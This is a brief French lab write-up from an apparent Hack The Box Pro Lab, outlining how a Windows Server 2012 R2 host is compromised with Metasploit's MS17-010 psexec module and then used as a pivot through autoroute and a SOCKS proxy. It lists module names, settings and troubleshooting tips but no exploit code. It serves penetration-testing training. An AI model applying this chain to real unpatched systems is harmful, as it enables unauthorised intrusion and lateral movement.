---
doc_kind: writeup
title: "DANTE DC01 - EternalBlue (ms17_010_psexec) et pivot Metasploit"
category: pwn
slug: dc01-eternalblue-psexec-pivot
created: 2026-10-29
status: solved
tags:
  - eternalblue
  - ms17-010
  - metasploit-pivot
  - autoroute
  - socks-proxy
source: "HTB Pro Lab DANTE"
target: "Windows Server 2012 R2 (MS17-010)"
---
# DANTE DC01 - EternalBlue (ms17_010_psexec) et pivot Metasploit

## Challenge Summary

- Source: HTB Pro Lab DANTE
- Target: Windows Server 2012 R2 (MS17-010)
- Goal: DC01 exploitable par MS17-010 mais uniquement via le module psexec (eternalblue direct echoue, offsets shellcode incompatibles); la session sert ensuite a router vers un second segment reseau.

## Initial Signals

- Entry point: see Exploit Chain step 1
- Visible hints: n/a (see source writeup)
- First confirming probe: see Exploit Chain

## Exploit Chain

1. use exploit/windows/smb/ms17_010_psexec (pas ms17_010_eternalblue qui echoue).
2. Configurer RHOSTS/Proxies/payload/LHOST/LPORT/ReverseAllowProxy -> run.
3. SYSTEM session obtenue -> flags (attention aux slashes, pas de backslash).
4. use post/multi/manage/autoroute, autoadd puis print (pas 'run autoroute' deprecie).
5. use auxiliary/server/socks_proxy, VERSION 5 obligatoire -> run -j -> acces au second segment.

## Key Evidence

- Log "Overwrite complete... SYSTEM session obtained!"; session Meterpreter ouverte.

## Dead Ends

- n/a (see Reusable Lessons)

## Payloads And Commands

```text
Module Metasploit ms17_010_psexec + payload meterpreter/reverse_tcp; post/multi/manage/autoroute + socks_proxy.
```

## Flag / Outcome

- Flag obtenu, chaine confirmee de bout en bout.

## Reusable Lessons

- Sur cible EternalBlue sensible aux offsets, toujours tester psexec avant eternalblue direct; port 445 peut devenir instable apres plusieurs essais; pivot Meterpreter via autoroute+socks_proxy (VERSION 5 uniquement).

## Pattern Candidates

- Voir pattern associe de meme slug.
